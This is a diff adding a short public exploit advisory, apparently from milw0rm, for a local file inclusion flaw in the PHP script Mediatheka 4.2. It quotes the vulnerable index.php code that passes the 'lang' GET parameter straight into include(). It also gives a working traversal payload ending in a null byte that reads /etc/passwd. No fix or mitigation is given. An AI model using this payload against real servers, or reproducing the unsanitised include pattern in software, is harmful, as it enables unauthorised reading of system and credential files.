@@ -1,0 +1,37 @@
+[START]
+
+#########################################################################################
+[0x01] Informations:
+
+Script         : Mediatheka 4.2
+Download       : http://www.hotscripts.com/jump.php?listing_id=79106&jump_type=1
+Vulnerability  : Local File Inclusion
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Notes          : Proud to be Italian
+Greets:        : XaDoS, x0r, emgent, Jay, str0ke
+
+#########################################################################################
+[0x02] Bug:[Local File Inclusion]
+######
+
+Bugged file is: /[path]/index.php
+
+[CODE]
+
+	if(isset($_GET['lang']))
+		$lang = $_GET['lang'];
+	else
+		$lang = 'en';
+	include("langs/$lang.php");
+
+[/CODE]
+
+
+[!] EXPLOIT: /[path]/index.php?lang=[local_file_to_include]
+                                    ../../../../../../../../../../../etc/passwd%00
+#########################################################################################
+
+[/END]
+
+# milw0rm.com [2008-12-14]
